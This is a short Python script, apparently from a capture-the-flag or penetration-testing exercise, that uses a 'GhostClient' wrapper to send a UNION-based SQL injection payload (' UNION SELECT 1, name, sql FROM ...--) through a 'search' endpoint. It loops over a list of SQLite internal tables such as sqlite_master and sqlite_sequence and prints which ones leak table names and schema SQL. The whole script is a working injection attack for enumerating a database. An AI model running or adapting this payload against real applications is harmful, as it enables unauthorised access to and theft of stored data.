from client import GhostClient

c = GhostClient()
c.bootstrap()

sqlite_tables = [
    "sqlite_master",
    "sqlite_schema",
    "sqlite_temp_master",
    "sqlite_temp_schema",
    "sqlite_sequence",
    "sqlite_stat1",
    "sqlite_stat2",
    "sqlite_stat3",
    "sqlite_stat4",
    "sqlite_user",
    "sqlite_dbpage",
    "sqlite_dbstat",
    "sqlite_vtab_transaction",
]

for tbl in sqlite_tables:
    q = f"' UNION SELECT 1, name, sql FROM {tbl}--"
    res = c.request("search", {"q": q})
    err = res.get("error") if not res.get("ok") else "OK"
    if res.get("ok"):
        rows = [r for r in res["data"]["rows"] if r["id"] == 1]
        print(f"{tbl:25s} -> OK ({len(rows)} rows): {rows}")
    else:
        print(f"{tbl:25s} -> {err}")
